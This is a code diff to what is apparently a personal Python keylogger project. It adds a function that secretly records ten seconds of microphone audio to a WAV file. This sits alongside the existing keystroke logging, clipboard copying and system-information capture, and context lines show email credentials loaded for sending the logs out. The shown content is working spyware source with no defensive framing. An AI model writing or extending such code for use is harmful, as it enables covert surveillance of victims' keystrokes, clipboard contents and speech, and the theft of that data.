@@ -33,9 +33,11 @@ load_dotenv()
 email_address = os.getenv('FROM_EMAIL_USER')
 password = os.getenv('EMAIL_PASSWORD')
 toaddr = os.getenv('TO_EMAIL_USER')
+microphone_time = 10
 key_information = "key_log.txt"
 system_information = "systeminfo.txt"
 clipboard_information = "clipboardinfo.txt"
+audio_information = "audio.wav"
 file_path = "/Users/rachittanwar/Documents/[02]/Coding/Cybersecurity/Python Keylogger/project"
 extend = "/"
 
@@ -95,6 +97,17 @@ def copy_clipboard():
             f.write("Clipboard cannot be copied")
 
 
+# get the microphone
+def microphone():
+    fs = 44100
+    seconds = microphone_time
+
+    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
+    sd.wait()
+
+    write(file_path + extend + audio_information, fs, myrecording)
+
+
 def on_press(key):
     global keys, count
 
@@ -130,4 +143,5 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
 
 # send_email(key_information, file_path + extend + key_information, toaddr)
 # computer_information()
-copy_clipboard()
+# copy_clipboard()
+microphone()
